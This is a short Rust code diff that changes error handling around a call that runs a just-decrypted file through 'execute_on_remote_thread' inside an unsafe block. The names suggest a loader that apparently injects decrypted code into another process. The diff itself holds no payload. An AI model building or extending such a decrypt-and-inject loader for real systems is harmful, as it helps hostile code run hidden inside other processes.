@@ -34,8 +34,6 @@ fn main() {
     println!("Files successfully decrypted!");
     
     unsafe { 
-        if execute_on_remote_thread(&first_file).is_ok() {
-            println!("Successfully executed file on remote thread");
-        }; 
+        execute_on_remote_thread(&first_file).unwrap();
     }
 }
